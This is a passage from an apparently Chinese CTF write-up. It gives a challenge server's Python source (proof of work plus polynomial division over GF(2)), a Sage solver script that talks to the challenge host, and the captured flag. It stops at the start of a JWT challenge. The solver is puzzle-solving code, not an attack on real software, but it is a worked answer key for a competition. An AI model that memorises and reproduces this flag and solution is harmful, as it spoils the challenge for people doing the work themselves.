class="keyword">import</span> string, random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> poly2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> s:s + <span class="built_in">bytes</span>([(<span class="built_in">len</span>(s)-<span class="number">1</span>)%<span class="number">16</span>+<span class="number">1</span>]*((<span class="built_in">len</span>(s)-<span class="number">1</span>)%<span class="number">16</span>+<span class="number">1</span>))</span><br><span class="line">testCases = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.send(<span class="string">b&quot;Bye~&quot;</span>)</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(<span class="string">f&quot;sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">guess</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line">        a,b,c = [getPrime(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">256</span>,<span class="number">256</span>,<span class="number">128</span>]]</span><br><span class="line">        pa,pb,pc = [PP(<span class="built_in">bin</span>(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a,b,c]]</span><br><span class="line">        r = pa*pb+pc</span><br><span class="line">        self.send(<span class="string">b&#x27;r(x) = &#x27;</span>+<span class="built_in">str</span>(r).encode())</span><br><span class="line">        self.send(<span class="string">b&#x27;a(x) = &#x27;</span>+<span class="built_in">str</span>(pa).encode())</span><br><span class="line">        self.send(<span class="string">b&#x27;c(x) = &#x27;</span>+<span class="built_in">str</span>(pc).encode())</span><br><span class="line">        self.send(<span class="string">b&#x27;Please give me the b(x) which satisfy a(x)*b(x)+c(x)=r(x)&#x27;</span>)</span><br><span class="line">        <span class="comment">#self.send(b&#x27;b(x) = &#x27;+str(pb).encode())</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> self.recv(prompt=<span class="string">b&#x27;&gt; b(x) = &#x27;</span>).decode() == <span class="built_in">str</span>(pb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment">#signal.alarm(1200)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> turn <span class="keyword">in</span> <span class="built_in">range</span>(testCases):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.guess():</span><br><span class="line">                self.send(<span class="string">b&quot;What a pity, work harder.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            self.send(<span class="string">b&quot;Success!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.send(<span class="string">b&#x27;Congratulations, this is you reward.&#x27;</span>)</span><br><span class="line">            self.send(flag)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer):</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10000</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure></li></ul><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><ul><li><p>工作量证明</p></li><li><p>模二多项式除法</p><p>代码实现了模二多项式乘法，且给出了$r = a*b+c$中的r、a、c，要求b</p><p>利用sage实现模二多项式除法，计算$b = (r-c)/a$，求解四十次，即解</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># nc 182.92.223.176 42952</span></span><br><span class="line">HOST = <span class="string">&#x27;182.92.223.176&#x27;</span></span><br><span class="line">PORT = <span class="number">42952</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(s.recv(<span class="number">1024</span>)).strip(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">sha_key = data[<span class="number">14</span>:<span class="number">30</span>]  <span class="comment"># like: dygRhRVGRA146H43</span></span><br><span class="line">sha_data = data[<span class="number">35</span>:<span class="number">99</span>]  <span class="comment"># like: d06a5396ad875acdf0796cc5b0c083170e38728847085cfd99dadaeda71a3d17</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">print</span>(sha_key)</span><br><span class="line"><span class="built_in">print</span>(sha_data)</span><br><span class="line"><span class="comment"># 第一关 sha256</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decry</span>(<span class="params">data</span>):</span></span><br><span class="line">    s = hashlib.sha256()  <span class="comment"># Get the hash algorithm.</span></span><br><span class="line">    s.update(data.encode())  <span class="comment"># Hash the data.</span></span><br><span class="line">    b = s.hexdigest()  <span class="comment"># Get he hash value.</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">list1 = [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;J&quot;</span>,</span><br><span class="line">             <span class="string">&quot;K&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;o&quot;</span>,</span><br><span class="line">             <span class="string">&quot;p&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yi</span>():</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> list1:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> list1:</span><br><span class="line">                    flag = <span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&quot;</span>.<span class="built_in">format</span>(a, b, c, d, sha_key)</span><br><span class="line">                    flag_sha = decry(flag)</span><br><span class="line">                    flag1 = flag[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(flag_sha) == <span class="built_in">str</span>(sha_data):</span><br><span class="line">                        <span class="built_in">print</span>(flag1)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;恭喜！&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">str</span>(flag1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">r,a,c</span>):</span></span><br><span class="line">    ax = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            ax += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            ax += x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ax += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    rx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> r.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            rx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            rx += x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rx += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    cx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            cx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            cx += x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cx += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    bx = (rx-cx)/ax</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(bx)</span><br><span class="line"></span><br><span class="line">S.&lt;x&gt; = PolynomialRing(GF(<span class="number">2</span>))</span><br><span class="line">s_ = s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(yi().encode())</span><br><span class="line">r = s.recv(<span class="number">1024</span>)</span><br><span class="line">ac = s.recv(<span class="number">1024</span>)</span><br><span class="line">r = <span class="built_in">str</span>(r).split(<span class="string">&#x27;= &#x27;</span>)[-<span class="number">1</span>].replace(<span class="string">r&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">a = <span class="built_in">str</span>(ac).split(<span class="string">&#x27;= &#x27;</span>)[<span class="number">1</span>].split(<span class="string">r&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">c = <span class="built_in">str</span>(ac).split(<span class="string">&#x27;= &#x27;</span>)[<span class="number">2</span>].split(<span class="string">r&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">ax = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        ax += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        ax += x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ax += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">rx = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        rx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        rx += x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rx += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">cx = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        cx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        cx += x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cx += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">bx = (rx-cx)/ax</span><br><span class="line">s.send(<span class="built_in">str</span>(bx).encode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>)) <span class="comment"># succeess</span></span><br><span class="line"></span><br><span class="line">tmp = s.recv(<span class="number">1024</span>)</span><br><span class="line">tmp = <span class="built_in">str</span>(tmp)</span><br><span class="line">tmp = tmp.split(<span class="string">r&#x27;= &#x27;</span>)</span><br><span class="line">r = tmp[<span class="number">1</span>].replace(<span class="string">r&#x27;\na(x) &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">a = tmp[<span class="number">2</span>].replace(<span class="string">r&#x27;\nc(x) &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">c = tmp[<span class="number">3</span>].split(<span class="string">r&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">ax = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        ax += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        ax += x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ax += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">rx = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        rx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        rx += x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rx += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">cx = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        cx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        cx += x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cx += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">bx = (rx-cx)/ax</span><br><span class="line">s.send(<span class="built_in">str</span>(bx).encode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>)) <span class="comment"># succeess</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> abcd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmp = s.recv(<span class="number">1024</span>)</span><br><span class="line">        tmp = <span class="built_in">str</span>(tmp)</span><br><span class="line">        tmp = tmp.split(<span class="string">r&#x27;= &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">        r = tmp[<span class="number">1</span>].replace(<span class="string">r&#x27;\na(x) &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        a = tmp[<span class="number">2</span>].replace(<span class="string">r&#x27;\nc(x) &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        c = tmp[<span class="number">3</span>].split(<span class="string">r&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        ax = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                ax += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                ax += x</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ax += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        rx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                rx += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                rx += x</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rx += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        cx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&#x27; + &#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                cx += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> i == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                cx += x</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cx += x^<span class="built_in">int</span>(i.replace(<span class="string">&#x27;x^&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        bx = (rx-cx)/ax</span><br><span class="line">        s.send(<span class="built_in">str</span>(bx).encode())</span><br><span class="line">        <span class="keyword">if</span> i!=<span class="number">37</span>:</span><br><span class="line">            <span class="built_in">print</span>(s.recv(<span class="number">1024</span>)) <span class="comment"># succeess</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line">            <span class="built_in">print</span>(s.recv(<span class="number">1024</span>)) <span class="comment"># flag</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;Success!\nCongratulations, this is you reward.\nflag&#123;08037511-8809-48ac-a54f-fca728f30089&#125;\n&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{08037511-8809-48ac-a54f-fca728f30089}</p></blockquote><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="myJWT"><a href="#myJWT" class="headerlink" title="myJWT"></a>myJWT</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 